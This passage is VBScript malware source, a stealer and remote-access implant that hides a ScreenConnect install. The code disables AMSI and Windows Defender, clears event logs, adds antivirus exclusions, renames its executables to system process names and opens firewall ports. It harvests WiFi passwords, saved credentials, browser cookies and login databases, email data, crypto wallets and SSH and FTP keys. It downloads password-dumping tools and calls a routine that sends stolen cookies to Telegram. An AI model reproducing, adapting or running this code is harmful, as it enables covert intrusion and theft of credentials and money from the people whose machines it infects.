    oShell.Run "powershell -Command ""[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"" ", 0, True
    On Error GoTo 0
End Sub

Sub FullyDisableDefender()
    On Error Resume Next
    oShell.Run "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender"" /v DisableAntiSpyware /t REG_DWORD /d 1 /f", 0, True
    oShell.Run "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f", 0, True
    oShell.Run "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f", 0, True
    oShell.Run "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f", 0, True
    oShell.Run "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet"" /v SpyNetReporting /t REG_DWORD /d 0 /f", 0, True
    Dim aSvcs : aSvcs = Array("WinDefend", "SecurityHealthService", "wscsvc", "Sense", "WdNisSvc")
    Dim sSvc
    For Each sSvc In aSvcs
        oShell.Run "net stop " & sSvc & " /y", 0, True
        oShell.Run "sc config " & sSvc & " start= disabled", 0, True
        WScript.Sleep 500
    Next
    oShell.Run "schtasks /change /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan"" /disable", 0, True
    oShell.Run "schtasks /change /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance"" /disable", 0, True
    oShell.Run "schtasks /change /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Cleanup"" /disable", 0, True
    On Error GoTo 0
End Sub

Sub ClearEventLogs()
    On Error Resume Next
    oShell.Run "wevtutil cl System", 0, True
    oShell.Run "wevtutil cl Application", 0, True
    oShell.Run "wevtutil cl Security", 0, True
    oShell.Run "wevtutil cl Setup", 0, True
    oShell.Run "wevtutil cl PowerShell", 0, True
    On Error GoTo 0
End Sub

Sub AddDefenderExclusion()
    On Error Resume Next
    oShell.Run "powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Program Files\ScreenConnect'""", 0, True
    oShell.Run "powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\ScreenConnect'""", 0, True
    oShell.Run "powershell -Command ""Add-MpPreference -ExclusionProcess 'ScreenConnect.WindowsClient.exe'""", 0, True
    oShell.Run "powershell -Command ""Add-MpPreference -ExclusionProcess 'ScreenConnect.Service.exe'""", 0, True
    On Error GoTo 0
End Sub

'==========================================================================
' STEALTH FUNCTIONS
'==========================================================================
Sub ForceHideApplication(sKeyword)
    On Error Resume Next
    Const HKLM = &H80000002, HKCU = &H80000001
    Dim objReg, aHives, aPaths, hKey, sPath
    Set objReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    aHives = Array(HKLM, HKCU)
    aPaths = Array("SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall")
    For Each hKey In aHives
        For Each sPath In aPaths
            Call SearchAndHide(objReg, hKey, sPath, sKeyword)
        Next
    Next
    Set objReg = Nothing
    On Error GoTo 0
End Sub

Sub SearchAndHide(objReg, hKey, sPath, sKeyword)
    On Error Resume Next
    Dim arrKeys, sKey, sDisp
    objReg.EnumKey hKey, sPath, arrKeys
    If IsArray(arrKeys) Then
        For Each sKey In arrKeys
            objReg.GetStringValue hKey, sPath & "\" & sKey, "DisplayName", sDisp
            If Not IsEmpty(sDisp) And sDisp <> "" Then
                If InStr(1, sDisp, sKeyword, vbTextCompare) > 0 Then
                    objReg.SetDWORDValue hKey, sPath & "\" & sKey, "SystemComponent", 1
                    objReg.DeleteValue hKey, sPath & "\" & sKey, "DisplayName"
                    objReg.DeleteValue hKey, sPath & "\" & sKey, "DisplayIcon"
                    objReg.DeleteValue hKey, sPath & "\" & sKey, "DisplayVersion"
                    objReg.DeleteValue hKey, sPath & "\" & sKey, "Publisher"
                    objReg.DeleteValue hKey, sPath & "\" & sKey, "URLInfoAbout"
                    objReg.DeleteValue hKey, sPath & "\" & sKey, "HelpLink"
                    objReg.DeleteValue hKey, sPath & "\" & sKey, "UninstallString"
                    objReg.DeleteValue hKey, sPath & "\" & sKey, "QuietUninstallString"
                    objReg.SetDWORDValue hKey, sPath & "\" & sKey, "NoRemove", 0
                    objReg.SetDWORDValue hKey, sPath & "\" & sKey, "NoModify", 1
                End If
            End If
        Next
    End If
    On Error GoTo 0
End Sub

Sub HideTrayIcon()
    On Error Resume Next
    Const HKLM = &H80000002
    Dim objReg
    Set objReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    objReg.SetDWORDValue HKLM, "SOFTWARE\ScreenConnect", "HideTrayIcon", 1
    objReg.SetDWORDValue HKLM, "SOFTWARE\WOW6432Node\ScreenConnect", "HideTrayIcon", 1
    objReg.SetDWORDValue HKLM, "SOFTWARE\ScreenConnect", "ShowTrayIcon", 0
    objReg.SetDWORDValue HKLM, "SOFTWARE\WOW6432Node\ScreenConnect", "ShowTrayIcon", 0
    Set objReg = Nothing
    On Error GoTo 0
End Sub

Sub HideControlBanner()
    On Error Resume Next
    Const HKLM = &H80000002
    Dim objReg
    Set objReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    objReg.SetDWORDValue HKLM, "SOFTWARE\ScreenConnect", "ShowGuestBanner", 0
    objReg.SetDWORDValue HKLM, "SOFTWARE\WOW6432Node\ScreenConnect", "ShowGuestBanner", 0
    objReg.SetDWORDValue HKLM, "SOFTWARE\ScreenConnect", "BannerOpacity", 0
    objReg.SetDWORDValue HKLM, "SOFTWARE\WOW6432Node\ScreenConnect", "BannerOpacity", 0
    objReg.SetDWORDValue HKLM, "SOFTWARE\ScreenConnect", "AutoMinimizeBanner", 1
    objReg.SetDWORDValue HKLM, "SOFTWARE\ScreenConnect", "AutoMinimizeDelay", 1
    objReg.SetDWORDValue HKLM, "SOFTWARE\WOW6432Node\ScreenConnect", "AutoMinimizeBanner", 1
    objReg.SetDWORDValue HKLM, "SOFTWARE\WOW6432Node\ScreenConnect", "AutoMinimizeDelay", 1
    Set objReg = Nothing
    On Error GoTo 0
End Sub

Sub RenameExecutableToSystemName()
    On Error Resume Next
    Dim aNames
    aNames = Array("svchost.exe", "winlogon.exe", "csrss.exe", "lsass.exe", "services.exe", "spoolsv.exe", "taskhostw.exe", "RuntimeBroker.exe")
    Randomize
    Dim sNew : sNew = aNames(Int(Rnd * UBound(aNames)))
    Dim aPaths
    aPaths = Array("C:\Program Files\ScreenConnect\", "C:\Program Files (x86)\ScreenConnect\", "C:\ProgramData\ScreenConnect\", oShell.ExpandEnvironmentStrings("%APPDATA%") & "\ScreenConnect\", oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\ScreenConnect\")
    Dim sPath
    For Each sPath In aPaths
        If oFSO.FolderExists(sPath) Then
            Dim oFol, oFil
            Set oFol = oFSO.GetFolder(sPath)
            For Each oFil In oFol.Files
                If LCase(oFSO.GetExtensionName(oFil.Name)) = "exe" Then
                    If InStr(1, oFil.Name, "ScreenConnect", vbTextCompare) > 0 Or InStr(1, oFil.Name, "ConnectWise", vbTextCompare) > 0 Then
                        oShell.Run "cmd /c rename """ & oFil.Path & """ " & sNew, 0, True
                    End If
                End If
            Next
            Set oFol = Nothing
        End If
    Next
    On Error GoTo 0
End Sub

'==========================================================================
' NETWORK ACCESS
'==========================================================================
Sub AddFirewallExceptions()
    On Error Resume Next
    Dim sExe : sExe = FindScreenConnectExe()
    If sExe <> "" Then
        oShell.Run "netsh advfirewall firewall add rule name=""SC-Inbound"" dir=in program=""" & sExe & """ action=allow profile=any", 0, True
        oShell.Run "netsh advfirewall firewall add rule name=""SC-Outbound"" dir=out program=""" & sExe & """ action=allow profile=any", 0, True
    End If
    Dim aPorts, nPort : aPorts = Array(443, 80, 8080, 8443, 5985, 5986)
    For Each nPort In aPorts
        oShell.Run "netsh advfirewall firewall add rule name=""SC-Port-" & nPort & """ dir=in protocol=tcp localport=" & nPort & " action=allow profile=any", 0, True
    Next
    On Error GoTo 0
End Sub

Function FindScreenConnectExe()
    On Error Resume Next
    Dim aPaths, sPath, oFol, oFil
    aPaths = Array("C:\Program Files\ScreenConnect\", "C:\Program Files (x86)\ScreenConnect\", "C:\ProgramData\ScreenConnect\", oShell.ExpandEnvironmentStrings("%APPDATA%") & "\ScreenConnect\", oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\ScreenConnect\")
    For Each sPath In aPaths
        If oFSO.FolderExists(sPath) Then
            Set oFol = oFSO.GetFolder(sPath)
            For Each oFil In oFol.Files
                If LCase(oFSO.GetExtensionName(oFil.Name)) = "exe" Then
                    FindScreenConnectExe = oFil.Path : Set oFol = Nothing : Exit Function
                End If
            Next
            Set oFol = Nothing
        End If
    Next
    FindScreenConnectExe = ""
    On Error GoTo 0
End Function
'==========================================================================
' DATA HARVESTING
'==========================================================================
Sub CreateDataDirectory()
    On Error Resume Next
    If oFSO.FolderExists(sDataDir) Then oFSO.DeleteFolder sDataDir, True
    oFSO.CreateFolder sDataDir
    On Error GoTo 0
End Sub

Sub HarvestWiFiCredentials()
    On Error Resume Next
    Dim sOut : sOut = sDataDir & "\WiFi_Credentials.txt"
    Dim oFil : Set oFil = oFSO.CreateTextFile(sOut, True)
    oFil.WriteLine "=== WiFi Credentials ==="
    oFil.WriteLine "Machine: " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
    oFil.WriteLine ""
    Dim bFnd : bFnd = False
    oShell.Run "cmd /c netsh wlan show profiles > """ & sTempDir & "\wifi_profiles.txt"" ", 0, True
    If oFSO.FileExists(sTempDir & "\wifi_profiles.txt") Then
        Dim oTmp, sLin
        Set oTmp = oFSO.OpenTextFile(sTempDir & "\wifi_profiles.txt")
        Do While oTmp.AtEndOfStream <> True
            sLin = oTmp.ReadLine
            If InStr(1, sLin, "All User Profile", vbTextCompare) > 0 Then
                bFnd = True
                Dim sPro : sPro = Trim(Mid(sLin, InStr(sLin, ":") + 1))
                Dim sPF : sPF = sTempDir & "\wifi_pass.txt"
                oShell.Run "cmd /c netsh wlan show profile name=""" & sPro & """ key=clear > """ & sPF & """", 0, True
                If oFSO.FileExists(sPF) Then
                    Dim oPF, sPL, sPW : sPW = "Not found"
                    Set oPF = oFSO.OpenTextFile(sPF)
                    Do While oPF.AtEndOfStream <> True
                        sPL = oPF.ReadLine
                        If InStr(1, sPL, "Key Content", vbTextCompare) > 0 Then
                            sPW = Trim(Mid(sPL, InStr(sPL, ":") + 1))
                        End If
                    Loop
                    oPF.Close
                    oFil.WriteLine "  Network: " & sPro & " | Password: " & sPW
                    oFSO.DeleteFile sPF, True
                End If
            End If
        Loop
        oTmp.Close
        oFSO.DeleteFile sTempDir & "\wifi_profiles.txt", True
    End If
    If Not bFnd Then oFil.WriteLine "  No WiFi profiles found."
    oFil.Close
    On Error GoTo 0
End Sub

Sub HarvestSavedPasswords()
    On Error Resume Next
    Dim sOut : sOut = sDataDir & "\Saved_Passwords.txt"
    Dim oFil : Set oFil = oFSO.CreateTextFile(sOut, True)
    oFil.WriteLine "=== Saved Windows Credentials ==="
    oFil.WriteLine "Machine: " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
    oFil.WriteLine ""
    Dim bFnd : bFnd = False
    oShell.Run "cmdkey /list > """ & sTempDir & "\cmdkey.txt""", 0, True
    If oFSO.FileExists(sTempDir & "\cmdkey.txt") Then
        Dim oTmp, sLin
        Set oTmp = oFSO.OpenTextFile(sTempDir & "\cmdkey.txt")
        Do While oTmp.AtEndOfStream <> True
            sLin = oTmp.ReadLine
            If InStr(1, sLin, "Target:", vbTextCompare) > 0 Then
                bFnd = True
                oFil.WriteLine sLin
            End If
        Loop
        oTmp.Close
        oFSO.DeleteFile sTempDir & "\cmdkey.txt", True
    End If
    If Not bFnd Then oFil.WriteLine "  No saved credentials found."
    oFil.Close
    On Error GoTo 0
End Sub

Sub HarvestBrowserData()
    On Error Resume Next
    Dim sBD : sBD = sDataDir & "\Browser_Data"
    If Not oFSO.FolderExists(sBD) Then oFSO.CreateFolder sBD
    Dim bFnd : bFnd = False
    
    Dim sCD : sCD = oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Google\Chrome\User Data"
    If oFSO.FolderExists(sCD) Then
        Dim sCO : sCO = sBD & "\Chrome"
        If Not oFSO.FolderExists(sCO) Then oFSO.CreateFolder sCO
        Dim oCF, oSF
        Set oCF = oFSO.GetFolder(sCD)
        For Each oSF In oCF.SubFolders
            If Left(oSF.Name, 8) = "Profile " Or oSF.Name = "Default" Then
                If oFSO.FileExists(oSF.Path & "\Cookies") Then
                    oFSO.CopyFile oSF.Path & "\Cookies", sCO & "\" & oSF.Name & "_Cookies.sqlite", True
                    bFnd = True
                End If
                If oFSO.FileExists(oSF.Path & "\Login Data") Then
                    oFSO.CopyFile oSF.Path & "\Login Data", sCO & "\" & oSF.Name & "_Login_Data.sqlite", True
                    bFnd = True
                End If
            End If
        Next
        If oFSO.FileExists(sCD & "\Local State") Then
            oFSO.CopyFile sCD & "\Local State", sCO & "\Local_State.json", True
        End If
        Set oCF = Nothing
    End If
    
    Dim sED : sED = oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Edge\User Data"
    If oFSO.FolderExists(sED) Then
        Dim sEO : sEO = sBD & "\Edge"
        If Not oFSO.FolderExists(sEO) Then oFSO.CreateFolder sEO
        Dim oEF, oSF2
        Set oEF = oFSO.GetFolder(sED)
        For Each oSF2 In oEF.SubFolders
            If Left(oSF2.Name, 8) = "Profile " Or oSF2.Name = "Default" Then
                If oFSO.FileExists(oSF2.Path & "\Cookies") Then
                    oFSO.CopyFile oSF2.Path & "\Cookies", sEO & "\" & oSF2.Name & "_Cookies.sqlite", True
                    bFnd = True
                End If
                If oFSO.FileExists(oSF2.Path & "\Login Data") Then
                    oFSO.CopyFile oSF2.Path & "\Login Data", sEO & "\" & oSF2.Name & "_Login_Data.sqlite", True
                    bFnd = True
                End If
            End If
        Next
        Set oEF = Nothing
    End If
    
    Dim sFD : sFD = oShell.ExpandEnvironmentStrings("%APPDATA%") & "\Mozilla\Firefox\Profiles"
    If oFSO.FolderExists(sFD) Then
        Dim sFO : sFO = sBD & "\Firefox"
        If Not oFSO.FolderExists(sFO) Then oFSO.CreateFolder sFO
        Dim oFF, oPF
        Set oFF = oFSO.GetFolder(sFD)
        For Each oPF In oFF.SubFolders
            If oFSO.FileExists(oPF.Path & "\cookies.sqlite") Then
                oFSO.CopyFile oPF.Path & "\cookies.sqlite", sFO & "\" & oPF.Name & "_cookies.sqlite", True
                bFnd = True
            End If
            If oFSO.FileExists(oPF.Path & "\logins.json") Then
                oFSO.CopyFile oPF.Path & "\logins.json", sFO & "\" & oPF.Name & "_logins.json", True
                bFnd = True
            End If
            If oFSO.FileExists(oPF.Path & "\key4.db") Then
                oFSO.CopyFile oPF.Path & "\key4.db", sFO & "\" & oPF.Name & "_key4.db", True
            End If
        Next
        Set oFF = Nothing
    End If
    
    If Not bFnd Then
        Dim sNF : sNF = sBD & "\No_Data.txt"
        Dim oNo : Set oNo = oFSO.CreateTextFile(sNF, True)
        oNo.WriteLine "No browser data found."
        oNo.Close
    End If
    On Error GoTo 0
End Sub

'==========================================================================
' HARVEST EMAIL CLIENTS
'==========================================================================
Sub HarvestEmailClients()
    On Error Resume Next
    Dim sOut : sOut = sDataDir & "\Email_Clients.txt"
    Dim oFil : Set oFil = oFSO.CreateTextFile(sOut, True)
    oFil.WriteLine "=== Email Client Credentials ==="
    oFil.WriteLine "Machine: " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
    oFil.WriteLine ""
    Dim bFnd : bFnd = False
    
    oFil.WriteLine "--- Microsoft Outlook ---"
    oShell.Run "reg query ""HKCU\Software\Microsoft\Office\16.0\Outlook\Profiles"" /s > """ & sTempDir & "\outlook.txt"" 2>nul", 0, True
    oShell.Run "reg query ""HKCU\Software\Microsoft\Office\15.0\Outlook\Profiles"" /s >> """ & sTempDir & "\outlook.txt"" 2>nul", 0, True
    If oFSO.FileExists(sTempDir & "\outlook.txt") Then
        Dim oTmp, sLin
        Set oTmp = oFSO.OpenTextFile(sTempDir & "\outlook.txt")
        Do While oTmp.AtEndOfStream <> True
            sLin = oTmp.ReadLine
            If sLin <> "" Then oFil.WriteLine "  " & sLin : bFnd = True
        Loop
        oTmp.Close
        oFSO.DeleteFile sTempDir & "\outlook.txt", True
    End If
    If Not bFnd Then oFil.WriteLine "  No Outlook profiles found."
    
    bFnd = False
    oFil.WriteLine "--- Mozilla Thunderbird ---"
    Dim sTD : sTD = oShell.ExpandEnvironmentStrings("%APPDATA%") & "\Thunderbird\Profiles"
    If oFSO.FolderExists(sTD) Then
        Dim oTF, oTP
        Set oTF = oFSO.GetFolder(sTD)
        For Each oTP In oTF.SubFolders
            oFil.WriteLine "  Profile: " & oTP.Name
            bFnd = True
            If oFSO.FileExists(oTP.Path & "\logins.json") Then
                oFil.WriteLine "  PASSWORDS FOUND: logins.json"
                oFSO.CopyFile oTP.Path & "\logins.json", sDataDir & "\thunderbird_logins_" & oTP.Name & ".json", True
                Dim oJF, sJC
                Set oJF = oFSO.OpenTextFile(oTP.Path & "\logins.json")
                sJC = oJF.ReadAll
                oJF.Close
                Dim aLn, sL2
                aLn = Split(sJC, vbLf)
                For Each sL2 In aLn
                    If InStr(1, sL2, "hostname", vbTextCompare) > 0 Then oFil.WriteLine "    " & Trim(sL2)
                    If InStr(1, sL2, "encryptedUsername", vbTextCompare) > 0 Then oFil.WriteLine "    " & Left(Trim(sL2), 100) & "..."
                    If InStr(1, sL2, "encryptedPassword", vbTextCompare) > 0 Then oFil.WriteLine "    " & Left(Trim(sL2), 100) & "..."
                Next
                oFil.WriteLine ""
            End If
            If oFSO.FileExists(oTP.Path & "\key4.db") Then
                oFil.WriteLine "  DECRYPTION KEY FOUND: key4.db"
                oFSO.CopyFile oTP.Path & "\key4.db", sDataDir & "\thunderbird_key4_" & oTP.Name & ".db", True
                oFil.WriteLine ""
            End If
        Next
        Set oTF = Nothing
    End If
    If Not bFnd Then oFil.WriteLine "  No Thunderbird profiles found."
    
    bFnd = False
    oFil.WriteLine "--- Windows Mail ---"
    oShell.Run "reg query ""HKCU\Software\Microsoft\Windows Mail"" /s > """ & sTempDir & "\winmail.txt"" 2>nul", 0, True
    If oFSO.FileExists(sTempDir & "\winmail.txt") Then
        Set oTmp = oFSO.OpenTextFile(sTempDir & "\winmail.txt")
        Do While oTmp.AtEndOfStream <> True
            sLin = oTmp.ReadLine
            If sLin <> "" Then oFil.WriteLine "  " & sLin : bFnd = True
        Loop
        oTmp.Close
        oFSO.DeleteFile sTempDir & "\winmail.txt", True
    End If
    If Not bFnd Then oFil.WriteLine "  No Windows Mail accounts found."
    oFil.Close
    On Error GoTo 0
End Sub

'==========================================================================
' HARVEST CRYPTO WALLETS
'==========================================================================
Sub HarvestCryptoWallets()
    On Error Resume Next
    Dim sWD : sWD = sDataDir & "\Crypto_Wallets"
    If Not oFSO.FolderExists(sWD) Then oFSO.CreateFolder sWD
    Dim sOut : sOut = sDataDir & "\Crypto_Wallets.txt"
    Dim oFil : Set oFil = oFSO.CreateTextFile(sOut, True)
    oFil.WriteLine "=== Crypto Wallets Found ==="
    oFil.WriteLine "Machine: " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
    oFil.WriteLine ""
    Dim bFnd : bFnd = False
    If ScanWallet("Bitcoin Core", oShell.ExpandEnvironmentStrings("%APPDATA%") & "\Bitcoin", "wallet.dat", sWD, oFil) Then bFnd = True
    If ScanWallet("Electrum", oShell.ExpandEnvironmentStrings("%APPDATA%") & "\Electrum\wallets", "default_wallet", sWD, oFil) Then bFnd = True
    If ScanWallet("Exodus", oShell.ExpandEnvironmentStrings("%APPDATA%") & "\Exodus", "exodus.wallet", sWD, oFil) Then bFnd = True
    If ScanWallet("Geth", oShell.ExpandEnvironmentStrings("%APPDATA%") & "\Ethereum\keystore", "*.json", sWD, oFil) Then bFnd = True
    
    Dim sMMP
    sMMP = oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn"
    If oFSO.FolderExists(sMMP) Then
        bFnd = True
        oFil.WriteLine "  Wallet: MetaMask"
        oFil.WriteLine "  Location: " & sMMP
        oFil.WriteLine ""
        Dim oMF, oMFile
        Set oMF = oFSO.GetFolder(sMMP)
        For Each oMFile In oMF.Files
            oFSO.CopyFile oMFile.Path, sWD & "\MetaMask_" & oMFile.Name, True
        Next
        Set oMF = Nothing
    End If
    
    If ScanWallet("Monero", oShell.ExpandEnvironmentStrings("%APPDATA%") & "\Monero", "*.wallet", sWD, oFil) Then bFnd = True
    If Not bFnd Then oFil.WriteLine "  No crypto wallets found."
    oFil.Close
    On Error GoTo 0
End Sub

Function ScanWallet(sName, sPath, sPat, sOut, oFil)
    ScanWallet = False
    On Error Resume Next
    If Not oFSO.FolderExists(sPath) Then Exit Function
    oFil.WriteLine "  Wallet: " & sName
    oFil.WriteLine "  Location: " & sPath
    Dim oFol, bFnd : bFnd = False
    Set oFol = oFSO.GetFolder(sPath)
    If InStr(sPat, "*") > 0 Then
        Dim oItem
        For Each oItem In oFol.Files
            If LCase(oFSO.GetExtensionName(oItem.Name)) = LCase(Mid(sPat, 2)) Or _
               Left(oItem.Name, Len(Left(sPat, InStr(sPat, "*") - 1))) = Left(sPat, InStr(sPat, "*") - 1) Then
                bFnd = True
                oFil.WriteLine "  File: " & oItem.Name & " (" & FormatFileSize(oItem.Size) & ")"
                oFSO.CopyFile oItem.Path, sOut & "\" & sName & "_" & oItem.Name, True
            End If
        Next
    Else
        If oFSO.FileExists(sPath & "\" & sPat) Then
            bFnd = True
            Dim oWF : Set oWF = oFSO.GetFile(sPath & "\" & sPat)
            oFil.WriteLine "  File: " & sPat & " (" & FormatFileSize(oWF.Size) & ")"
            oFSO.CopyFile oWF.Path, sOut & "\" & sName & "_" & sPat, True
            Set oWF = Nothing
        End If
    End If
    If bFnd Then oFil.WriteLine "  Status: Wallet file found" : ScanWallet = True Else oFil.WriteLine "  Status: No wallet files found"
    oFil.WriteLine ""
    Set oFol = Nothing
    On Error GoTo 0
End Function

'==========================================================================
' HARVEST FTP/SSH KEYS
'==========================================================================
Sub HarvestFTPSSHKeys()
    On Error Resume Next
    Dim sOD : sOD = sDataDir & "\FTP_SSH_Keys"
    If Not oFSO.FolderExists(sOD) Then oFSO.CreateFolder sOD
    Dim sOut : sOut = sDataDir & "\FTP_SSH_Credentials.txt"
    Dim oFil : Set oFil = oFSO.CreateTextFile(sOut, True)
    oFil.WriteLine "=== FTP & SSH Credentials ==="
    oFil.WriteLine "Machine: " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
    oFil.WriteLine ""
    Dim bFnd : bFnd = False
    
    oFil.WriteLine "--- FileZilla ---"
    Dim sFZ : sFZ = oShell.ExpandEnvironmentStrings("%APPDATA%") & "\FileZilla"
    If oFSO.FolderExists(sFZ) Then
        If oFSO.FileExists(sFZ & "\recentservers.xml") Then
            oFSO.CopyFile sFZ & "\recentservers.xml", sOD & "\FileZilla_recentservers.xml", True
            oFil.WriteLine "  File: recentservers.xml" : bFnd = True
        End If
        If oFSO.FileExists(sFZ & "\sitemanager.xml") Then
            oFSO.CopyFile sFZ & "\sitemanager.xml", sOD & "\FileZilla_sitemanager.xml", True
            oFil.WriteLine "  File: sitemanager.xml" : bFnd = True
        End If
    End If
    If Not bFnd Then oFil.WriteLine "  No FileZilla data found."
    
    bFnd = False
    oFil.WriteLine "--- WinSCP ---"
    Dim sWS : sWS = oShell.ExpandEnvironmentStrings("%APPDATA%") & "\WinSCP.ini"
    If oFSO.FileExists(sWS) Then
        oFSO.CopyFile sWS, sOD & "\WinSCP.ini", True
        oFil.WriteLine "  File: WinSCP.ini" : bFnd = True
    End If
    If Not bFnd Then oFil.WriteLine "  No WinSCP data found."
    
    bFnd = False
    oFil.WriteLine "--- SSH Keys ---"
    Dim sSD, oSF, oSSH
    sSD = oShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\.ssh"
    If oFSO.FolderExists(sSD) Then
        Set oSF = oFSO.GetFolder(sSD)
        For Each oSSH In oSF.Files
            If InStr(1, oSSH.Name, "id_") > 0 Or InStr(1, oSSH.Name, "known_hosts") > 0 Then
                oFSO.CopyFile oSSH.Path, sOD & "\SSH_" & oSSH.Name, True
                oFil.WriteLine "  Key: " & oSSH.Name & " (" & FormatFileSize(oSSH.Size) & ")" : bFnd = True
            End If
        Next
        Set oSF = Nothing
    End If
    If Not bFnd Then oFil.WriteLine "  No SSH keys found."
    oFil.Close
    On Error GoTo 0
End Sub

'==========================================================================
' GATHER SYSTEM INVENTORY
'==========================================================================
Sub GatherSystemInventory()
    On Error Resume Next
    Dim sInfo
    sInfo = "[PC] Computer: " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%") & "%0A"
    sInfo = sInfo & "[USER] Username: " & oShell.ExpandEnvironmentStrings("%USERNAME%") & "%0A"
    Dim colOS, objOS
    Set colOS = oWMI.ExecQuery("SELECT * FROM Win32_OperatingSystem")
    For Each objOS In colOS
        sInfo = sInfo & "[OS] " & objOS.Caption & " (" & objOS.OSArchitecture & ")%0A"
    Next
    Dim colCPU, objCPU
    Set colCPU = oWMI.ExecQuery("SELECT * FROM Win32_Processor")
    For Each objCPU In colCPU
        sInfo = sInfo & "[CPU] " & Trim(objCPU.Name) & " (" & objCPU.NumberOfCores & " cores)%0A" : Exit For
    Next
    Dim colRAM, objRAM, nRAM
    Set colRAM = oWMI.ExecQuery("SELECT * FROM Win32_ComputerSystem")
    For Each objRAM In colRAM
        nRAM = Round(objRAM.TotalPhysicalMemory / 1073741824, 1)
        sInfo = sInfo & "[RAM] " & nRAM & " GB%0A" : Exit For
    Next
    Dim oDrv : Set oDrv = oFSO.GetDrive("C:")
    If oDrv.IsReady Then sInfo = sInfo & "[DISK] C: " & FormatFileSize(oDrv.TotalSize) & " (" & FormatFileSize(oDrv.FreeSpace) & " free)%0A"
    Dim colNet, objNet
    Set colNet = oWMI.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
    For Each objNet In colNet
        If Not IsNull(objNet.IPAddress) Then sInfo = sInfo & "[NET] IP: " & objNet.IPAddress(0) & "%0A"
        If Not IsNull(objNet.MACAddress) Then sInfo = sInfo & "[NET] MAC: " & objNet.MACAddress & "%0A"
        Exit For
    Next
    g_SystemInfo = sInfo
    On Error GoTo 0
End Sub

'==========================================================================
' BROWSER PASSWORDS CSV EXPORT
'==========================================================================
Sub ExportAndSendBrowserPasswords()
    On Error Resume Next
    Dim sPassDir, sChromeURL, sEdgeURL, sChromeExe, sEdgeExe
    Dim sChromeCSV, sEdgeCSV, sZipPath, sZipPass
    Dim bChromeFound, bEdgeFound
    
    sPassDir = sTempDir & "\SC_Passwords"
    sChromeURL = "https://www.nirsoft.net/toolsdownload/chromepass.zip"
    sEdgeURL = "https://www.nirsoft.net/toolsdownload/edgepassview.zip"
    sChromeExe = sPassDir & "\chromepass.exe"
    sEdgeExe = sPassDir & "\edgepassview.exe"
    sChromeCSV = sPassDir & "\Chrome_Passwords.csv"
    sEdgeCSV = sPassDir & "\Edge_Passwords.csv"
    sZipPath = sTempDir & "\SC_Passwords_" & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%") & ".zip"
    sZipPass = "infected_2024"
    bChromeFound = False : bEdgeFound = False
    
    Dim colProcs, objProc
    Set colProcs = oWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name='chrome.exe' OR Name='msedge.exe'")
    For Each objProc In colProcs
        objProc.Terminate() : WScript.Sleep 1000
    Next
    WScript.Sleep 3000
    
    Dim sChromeData, sEdgeData, sChromePF, sChromePF86, sEdgePF, sEdgePF86
    Dim bChromeInst, bEdgeInst
    
    sChromeData = oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Google\Chrome\User Data"
    sChromePF = oShell.ExpandEnvironmentStrings("%PROGRAMFILES%") & "\Google\Chrome\Application"
    sChromePF86 = oShell.ExpandEnvironmentStrings("%PROGRAMFILES(X86)%") & "\Google\Chrome\Application"
    sEdgeData = oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Edge\User Data"
    sEdgePF = oShell.ExpandEnvironmentStrings("%PROGRAMFILES%") & "\Microsoft\Edge\Application"
    sEdgePF86 = oShell.ExpandEnvironmentStrings("%PROGRAMFILES(X86)%") & "\Microsoft\Edge\Application"
    
    bChromeInst = (oFSO.FolderExists(sChromeData) Or oFSO.FolderExists(sChromePF) Or oFSO.FolderExists(sChromePF86))
    bEdgeInst = (oFSO.FolderExists(sEdgeData) Or oFSO.FolderExists(sEdgePF) Or oFSO.FolderExists(sEdgePF86))
    
    If Not bChromeInst And Not bEdgeInst Then
        Call SendCookiesToTelegram()
        Exit Sub
    End If
    
    If Not oFSO.FolderExists(sPassDir) Then oFSO.CreateFolder sPassDir
    
    If DownloadFile(sChromeURL, sPassDir & "\chromepass.zip") Then
        oShell.Run "powershell -Command ""Expand-Archive -Path '" & sPassDir & "\chromepass.zip' -DestinationPath '" & sPassDir & "' -Force"" ", 0, True
        oFSO.DeleteFile sPassDir & "\chromepass.zip", True : WScript.Sleep 1000
    End If
    If Not oFSO.FileExists(sChromeExe) Then
